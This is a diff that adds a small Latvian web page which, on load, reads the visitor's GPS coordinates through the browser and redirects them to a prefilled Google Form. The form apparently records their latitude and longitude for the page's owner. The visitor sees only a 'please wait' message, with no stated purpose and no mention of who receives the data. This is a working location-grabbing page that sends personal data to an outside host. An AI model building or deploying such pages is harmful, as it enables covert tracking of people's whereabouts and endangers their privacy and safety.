@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="lv">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GPS Piekļuve</title>
+    <script>
+        function getLocationAndRedirect() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lng = position.coords.longitude;
+                    
+                    // Google Forms saite ar GPS datiem
+                    let formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfoCCAeJs8sD_F3xoMuLbQi6Lz_jXBuWwNX_WZ3JNWEDJWH8g/viewform?usp=pp_url&entry.559881896=" 
+                                  + "Latitude:" + lat + " | Longitude:" + lng;
+                    
+                    window.location.href = formUrl;
+                }, function(error) {
+                    alert("GPS piekļuve liegta vai kļūda GPS datos.");
+                });
+            } else {
+                alert("Jūsu ierīce neatbalsta GPS.");
+            }
+        }
+    </script>
+</head>
+<body onload="getLocationAndRedirect()">
+    <h2>Lūdzu, uzgaidiet... Iegūstam GPS datus.</h2>
+</body>
+</html>
